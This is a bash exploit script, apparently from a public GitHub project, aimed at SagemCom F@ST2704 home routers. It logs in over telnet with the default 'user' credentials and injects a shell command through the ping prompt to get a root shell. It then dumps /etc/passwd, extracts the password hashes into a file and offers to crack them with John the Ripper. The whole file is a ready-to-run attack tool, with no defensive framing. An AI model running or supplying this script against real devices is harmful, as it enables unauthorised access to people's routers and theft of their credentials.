#!/bin/bash
#	~Mixbo
#	https://github.com/Mixbo/FaST2704/
#	www.wakowakowako.com

function main()
{
	echo "[+] Launching SagemCom F@ST2704 passwd Tool"
	type expect >/dev/null 2>&1 || { echo >&2 "[-] expect is not installed. Closing program..."; exit 1; }
	logfile="hashes.log"
	hashfile="hashes.txt"

	if [ -z "$1" ]
	  then
	    host="192.168.1.1"
	  else
	  	host=$1
	fi

	echo "[+] Connecting to host $host"


	(expect -c "
		set timeout 20
		spawn telnet $host
		expect \"Login:\"
		send \"user\r\"
		expect \"Password:\"
		send \"user\r\"
		expect \">\"
		send \"ping -c 1 127.0.0.1;bash\n\"
		expect \"#\"
		send \"cat /etc/passwd\n\"
		expect \"#\"
		exit
	") > $logfile
	echo "[+] Saved session in $logfile"

	parse

	type sudo john >/dev/null 2>&1 || { echo >&2 "[-] John the Ripper is not installed. Closing program..."; exit 1; }

	read -p "[+] Do you want to feed the hashes to John the Ripper? [y/*] " choice
	case $choice in
		[Yy]* )
			echo -e "[+] Starting John the Ripper to crack $hashfile\n\n"
			sudo john $hashfile
			echo -e "\n\n"
			sudo john $hashfile --show

	esac
}

function parse()
{
	echo "[+] Parsing hashes"
	cat $logfile | while read line; do
		if [[ $i -eq 20 ]]; then
			echo $line > $hashfile
		else
			if [[ $i -gt 20 ]]; then
				echo $line >> $hashfile
			fi
		fi
		i=$i+1
	done
	echo "[+] Hashes saved in $hashfile !"
}
main $1
echo "[+] Closing program..."
exit

